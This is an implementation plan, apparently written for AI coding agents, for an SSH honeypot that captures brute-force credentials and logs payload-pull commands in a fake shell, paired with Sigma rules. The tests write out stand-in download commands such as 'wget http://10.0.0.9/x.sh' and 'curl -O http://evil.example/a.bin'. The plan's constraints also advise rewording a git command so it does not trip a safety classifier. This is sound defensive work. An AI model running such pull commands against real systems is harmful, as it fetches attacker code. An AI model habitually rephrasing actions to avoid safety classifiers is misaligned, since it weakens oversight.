<!-- SPDX-License-Identifier: GPL-3.0-or-later -->
# SSH Credential-Capture Honeypot + Paired Detections — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an `ssh` service that completes a real SSH key exchange (via `asyncssh`), captures every brute-force credential attempt, then grants a fake shell that logs post-auth commands (recon + payload-pull URLs) while executing and fetching nothing — paired with two Sigma rules.

**Architecture:** One service file (`services/ssh.py`) subclasses `BaseService`; an inner `asyncssh.SSHServer` handles auth (capture + accept policy), and a `process_factory` runs the fake shell backed by a pure command emulator (`services/ssh_shell.py`). Telemetry: `credentials` (context) per attempt, `ssh-bruteforce` and `ssh-payload-pull` signals, each paired. Config + orchestrator registration + REFERENCE/README round it out.

**Tech Stack:** Python 3.10–3.12 (dev/CI); `asyncssh` (asyncio SSH; pulls in `cryptography`); pytest; PyYAML (lint/guard). All asyncssh mechanics below were verified against asyncssh 2.24.0 on the project venv.

## Global Constraints

- Run tests with `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest` (plain `python`/`python3` lack pytest/asyncssh; the `.venv` has them).
- Every new source/YAML file starts with `# SPDX-License-Identifier: GPL-3.0-or-later` (a PostToolUse hook enforces this on `.py`).
- Commit with **plain** `git commit -s` **plus the co-author trailer** as a second `-m`; do NOT use the inline `git -c user.name=… -c user.email=…` override (it trips the harness safety classifier). Template:
  `git commit -s -m "<subject>" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"`
  The repo-local identity is already `cac0ns3c <11958671+cac0ns3c@users.noreply.github.com>`.
- `asyncssh` is already installed in the `.venv`. Task 1 adds it to `pyproject.toml`. Verify import in Task 1 step 1.
- `ssh-bruteforce` and `ssh-payload-pull` are **signal** tags — paired by Sigma rules in Task 5 and must **NOT** be added to `CONTEXT_OR_ANALYTIC_TAGS` in `tests/test_detection_pairing.py`. `credentials` is **already declared** context there — do not touch it.
- **TASK-ORDERING (important):** Task 1 emits only `credentials` (already-declared context), so the pairing guard stays green after Task 1. Task 2 begins emitting `ssh-bruteforce` and Task 4 `ssh-payload-pull`, whose rules do not exist until Task 5 — so `tests/test_detection_pairing.py` is **RED by design** from Task 2 through Task 4. Therefore **Tasks 1–4 run only the targeted test files** (`tests/test_ssh_service.py`, `tests/test_ssh_shell.py`), never the full suite. Task 5 makes the guard green; Task 6 runs the full suite.
- `ssh` is an `asyncssh` server: integration tests MUST drive client and server in **one** event loop — `asyncssh.connect(...)` inside a single `asyncio.run(...)`. Poll the JSONL log for emitted events (never a fixed sleep).
- asyncssh specifics (verified): host key via `asyncssh.generate_private_key('ssh-ed25519')` / `key.write_private_key(path)` / `asyncssh.read_private_key(path)`; `await asyncssh.create_server(factory, host=, port=, server_host_keys=[key], server_version=<token without the 'SSH-2.0-' prefix — asyncssh re-adds it>, process_factory=)` returns an acceptor with `.get_port()`, `.close()`, `.wait_closed()`; `client_version` is available in `begin_auth`/`validate_password` (NOT `connection_made`); a client `SSHClient.password_auth_requested()` returning successive passwords produces multiple `validate_password` calls in one connection; `process.command` is the exec string (None for an interactive shell), `process.get_extra_info('peername')` gives the peer, `async for line in process.stdin` reads interactive commands.

---

### Task 1: Dependency, config, host key, and a deny-all SSH server that logs `credentials`

**Files:**
- Modify: `pyproject.toml` (add `asyncssh` to `dependencies`)
- Modify: `src/lyrebird/config.py` (add the `"ssh"` defaults line, after the `"pop3"` line ~33)
- Modify: `src/lyrebird/orchestrator.py` (gated registration, after the `REGISTRY` dict ~line 56)
- Create: `src/lyrebird/services/ssh.py`
- Test: `tests/test_ssh_service.py` (create)

**Interfaces:**
- Produces: `SshService(BaseService)` with `name="ssh"`, attribute `self.port`, async `start()`/`stop()`, and `self._server` (an `asyncssh.SSHAcceptor`). Emits an `auth` event with `tags=["credentials"]` and `request={"user","password","method","accepted"}` per password attempt. Config keys: `port` (22), `banner`, `accept_after` (3), `weak_creds` ([]), `bruteforce_threshold` (3).

- [ ] **Step 1: Verify asyncssh imports in the venv**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -c "import asyncssh; print(asyncssh.__version__)"`
Expected: prints a version (e.g. `2.24.0`). If it errors, STOP and report — the whole feature depends on it.

- [ ] **Step 2: Write the failing tests**

Create `tests/test_ssh_service.py`:

```python
# SPDX-License-Identifier: GPL-3.0-or-later
"""Integration tests: SSH honeypot captures credentials, brute-force, and shell."""
import asyncio
import json
import time
from pathlib import Path
import sys

import asyncssh

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from lyrebird.events import EventSink  # noqa: E402
from lyrebird.services.ssh import SshService  # noqa: E402


def _wait_for_events(log: Path, timeout: float = 10.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if log.exists():
            lines = [l for l in log.read_text().splitlines() if l.strip()]
            if lines:
                return [json.loads(l) for l in lines]
        time.sleep(0.05)
    return []


def _client(passwords):
    class _C(asyncssh.SSHClient):
        def __init__(self):
            self._pw = list(passwords)
        def password_auth_requested(self):
            return self._pw.pop(0) if self._pw else None
    return _C


def test_ssh_denies_and_logs_credentials(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 99}, sink=sink,
                     bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        try:
            await asyncssh.connect("127.0.0.1", port, username="root",
                                   known_hosts=None, client_factory=_client(["hunter2"]))
        except asyncssh.PermissionDenied:
            pass
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert creds, "no credentials event emitted"
    assert creds[0]["request"]["user"] == "root"
    assert creds[0]["request"]["password"] == "hunter2"
    assert creds[0]["request"]["accepted"] is False
    assert creds[0]["service"] == "ssh"


def test_ssh_host_key_persists(tmp_path):
    sink = EventSink(session="t", log_path=tmp_path / "e.jsonl", echo=False)

    async def start_stop():
        svc = SshService(cfg={"port": 0}, sink=sink, bind_address="127.0.0.1",
                         data_dir=tmp_path, tls={})
        await svc.start()
        await svc.stop()

    asyncio.run(start_stop())
    key_path = tmp_path / "ssh" / "host_key"
    assert key_path.exists()
    first = key_path.read_bytes()
    asyncio.run(start_stop())
    assert key_path.read_bytes() == first  # reused, not regenerated
    sink.close()
```

- [ ] **Step 3: Run to verify failure**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_service.py -v`
Expected: FAIL — `ModuleNotFoundError: lyrebird.services.ssh` (the module does not exist yet).

- [ ] **Step 4: Add config defaults**

In `src/lyrebird/config.py`, add the `"ssh"` line immediately after the `"pop3"` line:

```python
        "pop3":     {"enabled": True,  "port": 110},
        "ssh":      {"enabled": True,  "port": 22,
                     "banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
                     "accept_after": 3, "weak_creds": [], "bruteforce_threshold": 3},
```

- [ ] **Step 5: Create the service (deny-all + credentials capture)**

Create `src/lyrebird/services/ssh.py`:

```python
# SPDX-License-Identifier: GPL-3.0-or-later
"""SSH honeypot.

Completes a real SSH key exchange (via asyncssh), captures every brute-force
credential attempt, and — after a threshold or a weak-credential match — grants
a fake shell that logs commands while executing and fetching NOTHING.
"""

from __future__ import annotations

import os
from typing import Any

import asyncssh

from ..base import BaseService


class _ConnHandler(asyncssh.SSHServer):
    """Per-connection auth handler. Logs each attempt; Task 2 adds acceptance."""

    def __init__(self, service: "SshService") -> None:
        self.service = service
        self.attempts = 0
        self.accepted = False
        self.client_version = ""
        self.peer = ("?", 0)
        self._conn: asyncssh.SSHServerConnection | None = None

    def connection_made(self, conn: asyncssh.SSHServerConnection) -> None:
        self._conn = conn
        self.peer = conn.get_extra_info("peername") or ("?", 0)

    def begin_auth(self, username: str) -> bool:
        # client_version is only populated after the banner exchange
        self.client_version = (self._conn.get_extra_info("client_version")
                               if self._conn else "") or ""
        return True  # always require auth

    def password_auth_supported(self) -> bool:
        return True

    def validate_password(self, username: str, password: str) -> bool:
        self.attempts += 1
        self.service.emit(
            transport="tcp", src_ip=self.peer[0], src_port=self.peer[1],
            dst_port=self.service.port, event_type="auth",
            summary=f"ssh auth user='{username}' accepted=False",
            request={"user": username, "password": password,
                     "method": "password", "accepted": False},
            tags=["credentials"])
        return False


class SshService(BaseService):
    name = "ssh"

    def __init__(self, *args: Any, **kwargs: Any) -> None:
        super().__init__(*args, **kwargs)
        self._server: asyncssh.SSHAcceptor | None = None
        self.port = int(self.cfg.get("port", 22))

    def _host_key(self) -> asyncssh.SSHKey:
        key_dir = self.data_dir / "ssh"
        key_dir.mkdir(parents=True, exist_ok=True)
        key_path = key_dir / "host_key"
        if key_path.exists():
            return asyncssh.read_private_key(str(key_path))
        key = asyncssh.generate_private_key("ssh-ed25519")
        key.write_private_key(str(key_path))
        os.chmod(str(key_path), 0o600)
        return key

    async def start(self) -> None:
        banner = str(self.cfg.get("banner", "SSH-2.0-OpenSSH_8.9p1"))
        version = banner.split("SSH-2.0-", 1)[-1]  # asyncssh re-adds the prefix
        self._server = await asyncssh.create_server(
            lambda: _ConnHandler(self), host=self.bind_address, port=self.port,
            server_host_keys=[self._host_key()], server_version=version)

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:
                pass
```

- [ ] **Step 6: Register the service (gated on asyncssh)**

In `src/lyrebird/orchestrator.py`, immediately after the `REGISTRY = { ... }` dict (after the closing `}` ~line 56), add:

```python
# SSH depends on the compiled `asyncssh` package; register it only if importable
# so a missing crypto dependency doesn't take down the rest of the emulator.
try:
    from .services.ssh import SshService
    REGISTRY["ssh"] = SshService
except Exception:  # asyncssh not installed
    pass
```

- [ ] **Step 7: Add asyncssh to dependencies**

In `pyproject.toml`, add `asyncssh` to the `dependencies` list (next to `pyyaml`/`requests`):

```toml
dependencies = [
    "pyyaml>=6.0",
    "requests>=2.31",
    "asyncssh>=2.14",
]
```

(Match the existing list's exact formatting; only add the one line.)

- [ ] **Step 8: Run the targeted tests to verify they pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_service.py -v`
Expected: PASS (2 passed). Do NOT run the full suite (not needed; guard is green here but stays targeted per the ordering rule).

- [ ] **Step 9: Commit**

```bash
git add pyproject.toml src/lyrebird/config.py src/lyrebird/orchestrator.py src/lyrebird/services/ssh.py tests/test_ssh_service.py
git commit -s -m "Add SSH honeypot service: capture brute-force credentials (deny-all)" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 2: Accept policy + `ssh-bruteforce` signal

**Files:**
- Modify: `src/lyrebird/services/ssh.py` (rewrite `validate_password`; add `connection_lost`)
- Test: `tests/test_ssh_service.py` (append)

**Interfaces:**
- Consumes: `SshService` / `_ConnHandler` from Task 1. Produces: acceptance when `weak_creds` matches or `attempts >= accept_after`; a per-connection `ssh-bruteforce` event `request={"attempts","client_version","accepted"}` when `attempts >= bruteforce_threshold`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_ssh_service.py`:

```python
def test_ssh_accepts_after_threshold_and_flags_bruteforce(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 3, "bruteforce_threshold": 3},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        conn = await asyncssh.connect(
            "127.0.0.1", port, username="root", known_hosts=None,
            client_factory=_client(["wrong1", "wrong2", "letmein"]))
        conn.close()
        await conn.wait_closed()
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 3
    assert creds[-1]["request"]["accepted"] is True
    bf = [e for e in events if "ssh-bruteforce" in e.get("tags", [])]
    assert bf, "no ssh-bruteforce signal"
    assert bf[0]["request"]["attempts"] == 3
    assert bf[0]["request"]["accepted"] is True
    assert isinstance(bf[0]["request"]["client_version"], str)


def test_ssh_weak_cred_accepted_immediately(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 99,
                          "weak_creds": [{"user": "root", "password": "root"}],
                          "bruteforce_threshold": 99},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        conn = await asyncssh.connect("127.0.0.1", port, username="root",
                                      known_hosts=None, client_factory=_client(["root"]))
        conn.close()
        await conn.wait_closed()
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    creds = [e for e in events if "credentials" in e.get("tags", [])]
    assert len(creds) == 1
    assert creds[0]["request"]["accepted"] is True
    assert [e for e in events if "ssh-bruteforce" in e.get("tags", [])] == []
```

- [ ] **Step 2: Run to verify failure**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_service.py -k "threshold or weak_cred" -v`
Expected: FAIL — `validate_password` always returns False (no acceptance, no `ssh-bruteforce`), so `accepted is True` and the bruteforce asserts fail.

- [ ] **Step 3: Replace `validate_password` and add `connection_lost`**

In `src/lyrebird/services/ssh.py`, replace the entire `validate_password` method with the version below and add `connection_lost` right after it:

```python
    def validate_password(self, username: str, password: str) -> bool:
        self.attempts += 1
        cfg = self.service.cfg
        weak = cfg.get("weak_creds") or []
        accept_after = int(cfg.get("accept_after", 3))
        accept = (any(username == c.get("user") and password == c.get("password")
                      for c in weak)
                  or self.attempts >= accept_after)
        if accept:
            self.accepted = True
        self.service.emit(
            transport="tcp", src_ip=self.peer[0], src_port=self.peer[1],
            dst_port=self.service.port, event_type="auth",
            summary=f"ssh auth user='{username}' accepted={accept}",
            request={"user": username, "password": password,
                     "method": "password", "accepted": accept},
            tags=["credentials"])
        return accept

    def connection_lost(self, exc: Exception | None) -> None:
        threshold = int(self.service.cfg.get("bruteforce_threshold", 3))
        if self.attempts >= threshold:
            self.service.emit(
                transport="tcp", src_ip=self.peer[0], src_port=self.peer[1],
                dst_port=self.service.port, event_type="request",
                summary=(f"ssh brute-force {self.attempts} attempts "
                         f"client='{self.client_version}' accepted={self.accepted}"),
                request={"attempts": self.attempts,
                         "client_version": self.client_version,
                         "accepted": self.accepted},
                tags=["ssh-bruteforce"])
```

- [ ] **Step 4: Run the targeted tests to verify they pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_service.py -v`
Expected: PASS (4 passed). Do NOT run the full suite — `test_detection_pairing.py` is now RED by design (`ssh-bruteforce` unpaired until Task 5).

- [ ] **Step 5: Commit**

```bash
git add src/lyrebird/services/ssh.py tests/test_ssh_service.py
git commit -s -m "SSH: accept policy (weak_creds/accept_after) + ssh-bruteforce signal" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 3: Command emulator (`ssh_shell.py`)

**Files:**
- Create: `src/lyrebird/services/ssh_shell.py`
- Test: `tests/test_ssh_shell.py` (create)

**Interfaces:**
- Produces: `respond(command: str) -> tuple[str, dict | None]` — returns `(canned_output, pull_info_or_None)` where `pull_info` is `{"tool": str, "url": str}` for a payload-pull command, else `None`. Pure (no I/O). Task 4 consumes it.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_ssh_shell.py`:

```python
# SPDX-License-Identifier: GPL-3.0-or-later
"""Unit tests for the pure SSH fake-shell command emulator."""
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from lyrebird.services.ssh_shell import respond  # noqa: E402


def test_recon_commands_have_canned_output():
    out, pull = respond("whoami")
    assert out == "root"
    assert pull is None
    assert respond("uname -a")[0].startswith("Linux")
    assert "root:x:0:0" in respond("cat /etc/passwd")[0]


def test_unknown_command_falls_back():
    out, pull = respond("frobnicate --now")
    assert "command not found" in out
    assert pull is None


def test_wget_payload_pull_extracts_url():
    out, pull = respond("wget http://10.0.0.9/x.sh")
    assert pull == {"tool": "wget", "url": "http://10.0.0.9/x.sh"}


def test_curl_payload_pull_extracts_url():
    _, pull = respond("curl -O http://evil.example/a.bin")
    assert pull == {"tool": "curl", "url": "http://evil.example/a.bin"}


def test_busybox_wget_recognised():
    _, pull = respond("busybox wget http://h.test/f")
    assert pull is not None
    assert pull["url"] == "http://h.test/f"


def test_tftp_bare_host_recognised():
    _, pull = respond("tftp -g -r m.bin 10.0.0.9")
    assert pull is not None
    assert pull["tool"] == "tftp"
    assert pull["url"] == "10.0.0.9"
```

- [ ] **Step 2: Run to verify failure**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_shell.py -v`
Expected: FAIL — `ModuleNotFoundError: lyrebird.services.ssh_shell`.

- [ ] **Step 3: Create the emulator**

Create `src/lyrebird/services/ssh_shell.py`:

```python
# SPDX-License-Identifier: GPL-3.0-or-later
"""Pure command emulator for the SSH fake shell.

Returns canned, inert output and recognises payload-pull commands
(wget/curl/tftp/busybox). Executes NOTHING, reads/writes NO files, and makes NO
network connections — it only inspects the command string. This is the scope
line for the honeypot: capture intent, perform nothing.
"""

from __future__ import annotations

import re
import shlex

_CANNED = {
    "uname": "Linux",
    "uname -a": "Linux lab 5.15.0-generic #1 SMP x86_64 GNU/Linux",
    "id": "uid=0(root) gid=0(root) groups=0(root)",
    "whoami": "root",
    "pwd": "/root",
    "ls": "",
    "hostname": "lab",
    "ps": "  PID TTY          TIME CMD\n    1 ?        00:00:00 init",
    "w": " 00:00:00 up 1 day,  0 users,  load average: 0.00, 0.00, 0.00",
    "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\n",
}

_PULL_TOOLS = ("wget", "curl", "tftp", "busybox")
_URL_RE = re.compile(r"((?:https?|ftp|tftp)://[^\s'\"]+)")
_HOST_RE = re.compile(r"^[\w-]+(?:\.[\w-]+)+$")  # e.g. 10.0.0.9 or evil.example


def _first_host(tokens: list[str]) -> str | None:
    for tok in tokens[1:]:
        if not tok.startswith("-") and _HOST_RE.match(tok):
            return tok
    return None


def respond(command: str) -> tuple[str, dict | None]:
    cmd = command.strip()
    try:
        tokens = shlex.split(cmd)
    except ValueError:
        tokens = cmd.split()

    tool = next((t.rsplit("/", 1)[-1] for t in tokens
                 if t.rsplit("/", 1)[-1] in _PULL_TOOLS), None)
    pull: dict | None = None
    if tool is not None:
        m = _URL_RE.search(cmd)
        url = m.group(1) if m else _first_host(tokens)
        if url:
            pull = {"tool": tool, "url": url}

    if cmd in _CANNED:
        out = _CANNED[cmd]
    elif tokens and tokens[0].rsplit("/", 1)[-1] in _CANNED:
        out = _CANNED[tokens[0].rsplit("/", 1)[-1]]
    elif tool is not None:
        out = ""  # download tools write to a file; benign empty stdout
    else:
        out = f"-bash: {tokens[0]}: command not found" if tokens else ""
    return out, pull
```

- [ ] **Step 4: Run the targeted tests to verify they pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_shell.py -v`
Expected: PASS (6 passed).

- [ ] **Step 5: Commit**

```bash
git add src/lyrebird/services/ssh_shell.py tests/test_ssh_shell.py
git commit -s -m "SSH: pure fake-shell command emulator (recon + payload-pull recognition)" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 4: Wire the fake shell + `ssh-payload-pull` signal

**Files:**
- Modify: `src/lyrebird/services/ssh.py` (import `respond`; add `process_factory` to `create_server`; add `_handle_shell` + `_run_command`)
- Test: `tests/test_ssh_service.py` (append)

**Interfaces:**
- Consumes: `respond()` (Task 3), the accepted session from Task 2. Produces: a per-command `request` event `{"command"}` (no tag) for ordinary commands, and `tags=["ssh-payload-pull"]` with `{"command","tool","url"}` for payload-pull commands. Canned output written to the client; nothing executed or fetched.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_ssh_service.py`:

```python
def test_ssh_shell_captures_commands_and_payload_pull(tmp_path):
    log = tmp_path / "e.jsonl"
    sink = EventSink(session="t", log_path=log, echo=False)
    svc = SshService(cfg={"port": 0, "accept_after": 1, "bruteforce_threshold": 99},
                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})

    async def scenario():
        await svc.start()
        port = svc._server.get_port()
        async with asyncssh.connect("127.0.0.1", port, username="root",
                                    known_hosts=None,
                                    client_factory=_client(["root"])) as conn:
            r1 = await conn.run("uname -a")
            r2 = await conn.run("wget http://10.0.0.9/x.sh")
            assert r1.stdout.strip().startswith("Linux")
            assert r2.exit_status == 0
        await svc.stop()

    asyncio.run(scenario())
    sink.close()
    events = _wait_for_events(log)
    cmds = [e for e in events if e.get("request", {}).get("command")]
    assert any(e["request"]["command"] == "uname -a" for e in cmds)
    pull = [e for e in events if "ssh-payload-pull" in e.get("tags", [])]
    assert pull, "no ssh-payload-pull signal"
    assert pull[0]["request"]["tool"] == "wget"
    assert pull[0]["request"]["url"] == "http://10.0.0.9/x.sh"
    assert pull[0]["service"] == "ssh"
```

- [ ] **Step 2: Run to verify failure**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_service.py::test_ssh_shell_captures_commands_and_payload_pull -v`
Expected: FAIL — with no `process_factory`, `conn.run(...)` fails to open a session (the awaited run raises / no command events are logged), so the asserts fail.

- [ ] **Step 3: Add the shell wiring**

In `src/lyrebird/services/ssh.py`:

(a) Add the import near the top (after `from ..base import BaseService`):

```python
from .ssh_shell import respond
```

(b) In `start()`, pass `process_factory=self._handle_shell` to `create_server`:

```python
        self._server = await asyncssh.create_server(
            lambda: _ConnHandler(self), host=self.bind_address, port=self.port,
            server_host_keys=[self._host_key()], server_version=version,
            process_factory=self._handle_shell)
```

(c) Add these two methods to `SshService`:

```python
    async def _handle_shell(self, process: asyncssh.SSHServerProcess) -> None:
        peer = process.get_extra_info("peername") or ("?", 0)
        try:
            if process.command is not None:
                self._run_command(process.command, peer, process)
            else:
                process.stdout.write("$ ")
                async for line in process.stdin:
                    cmd = line.strip()
                    if not cmd:
                        process.stdout.write("$ ")
                        continue
                    if cmd in ("exit", "logout", "quit"):
                        break
                    self._run_command(cmd, peer, process)
                    process.stdout.write("$ ")
        except Exception:
            pass  # a dropped session must not escape the handler
        finally:
            try:
                process.exit(0)
            except Exception:
                pass

    def _run_command(self, cmd: str, peer, process: asyncssh.SSHServerProcess) -> None:
        output, pull = respond(cmd)
        process.stdout.write(output + ("\n" if not output.endswith("\n") else ""))
        if pull is not None:
            self.emit(transport="tcp", src_ip=peer[0], src_port=peer[1],
                      dst_port=self.port, event_type="request",
                      summary=f"ssh payload-pull {pull['tool']} {pull['url']}",
                      request={"command": cmd, "tool": pull["tool"], "url": pull["url"]},
                      tags=["ssh-payload-pull"])
        else:
            self.emit(transport="tcp", src_ip=peer[0], src_port=peer[1],
                      dst_port=self.port, event_type="request",
                      summary=f"ssh shell: {cmd}",
                      request={"command": cmd}, tags=[])
```

- [ ] **Step 4: Run the targeted tests to verify they pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_ssh_service.py -v`
Expected: PASS (5 passed). Full suite still NOT run — pairing guard RED until Task 5.

- [ ] **Step 5: Commit**

```bash
git add src/lyrebird/services/ssh.py tests/test_ssh_service.py
git commit -s -m "SSH: fake shell captures commands + ssh-payload-pull signal (fetches nothing)" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 5: Paired Sigma rules

**Files:**
- Create: `detections/sigma/ssh_bruteforce.yml`
- Create: `detections/sigma/ssh_shell_payload_pull.yml`

**Interfaces:**
- Consumes: the `ssh-bruteforce` (Task 2) and `ssh-payload-pull` (Task 4) tags. Makes the pairing guard green.

- [ ] **Step 1: Confirm the guard is currently RED**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_detection_pairing.py -v`
Expected: FAIL — reports `ssh.py -> ['ssh-bruteforce', 'ssh-payload-pull']` as emitted/unpaired. (Expected interim state from Tasks 2–4.)

- [ ] **Step 2: Create the two rules**

Create `detections/sigma/ssh_bruteforce.yml`:

```yaml
# SPDX-License-Identifier: GPL-3.0-or-later
title: SSH Brute-Force By Sample (Credential Guessing / Lateral Movement)
id: 2f8d1c4a-6b7e-4a1d-9c2f-3e5b7a9d0c11
status: experimental
description: >
  The Lyrebird SSH honeypot completes a real key exchange and tags a connection
  'ssh-bruteforce' once it makes repeated password attempts. In an isolated
  single-sample lab there are no administrators, so a sample guessing SSH
  credentials is a brute-force / lateral-movement tell.
  Pair: services/ssh.py tags such connections 'ssh-bruteforce' (attempts,
  client_version, and accepted recorded).
author: Lyrebird
date: 2026/06/30
logsource:
  product: lyrebird
  service: ssh
detection:
  selection:
    service: 'ssh'
    tags|contains: 'ssh-bruteforce'
  condition: selection
fields:
  - src_ip
  - request.attempts
  - request.client_version
  - request.accepted
falsepositives:
  - Legitimate administrators or scanners using repeated SSH auth outside a
    single-sample analysis lab
level: medium
```

Create `detections/sigma/ssh_shell_payload_pull.yml`:

```yaml
# SPDX-License-Identifier: GPL-3.0-or-later
title: Second-Stage Payload Pull Over SSH Shell
id: 7c3a9e21-0d4b-4f6a-8e15-2b9c6d1f4a83
status: experimental
description: >
  After the Lyrebird SSH honeypot grants a fake shell, a command that fetches a
  remote payload (wget/curl/tftp/busybox) is tagged 'ssh-payload-pull' with the
  extracted URL. The emulator logs the request but never fetches anything. A
  sample retrieving a second stage over an SSH shell is a strong loader tell.
  Pair: services/ssh.py tags such commands 'ssh-payload-pull' (command, tool,
  url recorded).
author: Lyrebird
date: 2026/06/30
logsource:
  product: lyrebird
  service: ssh
detection:
  selection:
    service: 'ssh'
    tags|contains: 'ssh-payload-pull'
  condition: selection
fields:
  - src_ip
  - request.tool
  - request.url
  - request.command
falsepositives:
  - An administrator fetching a file through an interactive SSH shell
level: high
```

- [ ] **Step 3: Run the guard + lint to verify pass**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/test_detection_pairing.py -v && PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python scripts/lint_sigma.py`
Expected: PASS — pairing guard green (do NOT touch `CONTEXT_OR_ANALYTIC_TAGS`); `Sigma lint OK`.

- [ ] **Step 4: Commit**

```bash
git add detections/sigma/ssh_bruteforce.yml detections/sigma/ssh_shell_payload_pull.yml
git commit -s -m "Pair ssh-bruteforce and ssh-payload-pull signals with Sigma rules" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

### Task 6: README, REFERENCE.md, and full-suite verification

**Files:**
- Modify: `README.md` (Services table row + dependency note)
- Modify: `REFERENCE.md` (generated)

- [ ] **Step 1: Add the README Services-table row**

In `README.md`, in the `## Services` table (the block of `| … |` rows), add one row (keep the column format identical to its neighbours):

```markdown
| SSH | TCP | ✅ implemented | asyncssh honeypot; captures brute-force credentials → fake shell logs commands (ssh-bruteforce, ssh-payload-pull) |
```

Then, wherever the README notes dependencies/install (or at the end of the Services section), add one sentence:

```markdown
> The SSH service requires the `asyncssh` dependency (installed automatically with Lyrebird); it is the one compiled dependency and can be omitted for a stdlib-only install — the SSH service is simply skipped if `asyncssh` is unavailable.
```

- [ ] **Step 2: Regenerate REFERENCE.md**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python scripts/gen_reference.py`
Expected: `wrote REFERENCE.md`. Then `git status --short` — only `REFERENCE.md` (and the README you just edited) should be modified. If `gen_reference.py` changed anything else, STOP and report.

- [ ] **Step 3: Run the FULL suite + lint (the drift guards)**

Run: `PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python -m pytest tests/ -q && PYTHONPATH=src /Users/anatneuman/Projects/Lyrebird/.venv/bin/python scripts/lint_sigma.py`
Expected: all tests PASS (including `test_reference.py`, `test_detection_pairing.py`, and the new SSH tests); `Sigma lint OK`.

- [ ] **Step 4: Commit**

```bash
git add README.md REFERENCE.md
git commit -s -m "Docs: SSH service row + dependency note; regenerate REFERENCE.md" -m "Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Self-review

**Spec coverage:**
- asyncssh server, real KEX, host key persisted under `data_dir/ssh/` → Task 1. ✓
- `credentials` context per attempt → Task 1 (deny) / Task 2 (accepted flag). ✓
- Accept on `weak_creds` match OR `accept_after`; `ssh-bruteforce` at `bruteforce_threshold` → Task 2. ✓
- Pure command emulator (recon + payload-pull recognition) → Task 3. ✓
- Fake shell via `process_factory`, per-command capture + `ssh-payload-pull`, fetches nothing → Task 4. ✓
- Two paired Sigma rules, `service: ssh` + tag selection, honest FPs, not in `CONTEXT_OR_ANALYTIC_TAGS` → Task 5. ✓
- asyncssh dependency + gated registration; README + REFERENCE.md + full suite → Tasks 1, 6. ✓
- One-event-loop + poll-for-artifact tests; brute-force, weak-cred, shell/payload-pull, host-key persistence → Tasks 1–4. ✓
- SPDX headers on new files; commits DCO-signed + co-author trailer → every task. ✓

**Placeholder scan:** No TBD/TODO; every code step shows complete code; both Sigma `id`s are concrete UUIDs. ✓

